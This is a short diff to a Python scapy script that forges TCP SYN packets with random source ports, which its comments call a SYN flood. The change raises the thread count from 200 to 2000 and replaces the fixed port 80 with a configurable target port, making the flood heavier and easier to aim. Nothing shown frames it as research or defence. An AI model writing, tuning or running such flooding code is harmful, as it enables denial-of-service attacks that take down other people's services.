@@ -15,7 +15,7 @@ from scapy.all import *
 
 target = None
 port = None
-thread_limit = 200
+thread_limit = 2000
 total = 0
 payload="A"*2000
 
@@ -35,7 +35,7 @@ class sendSYN(threading.Thread):
 		#Layer 4 forging
 		tcp = TCP()
 		tcp.sport = random.randint(1025,65535)
-		tcp.dport = 80
+		tcp.dport = port
 		#Here comes the SYN flood mechanic part, yes, that easy
 		#Only make sure you don't respond with another script!
 		tcp.flags = 'S'
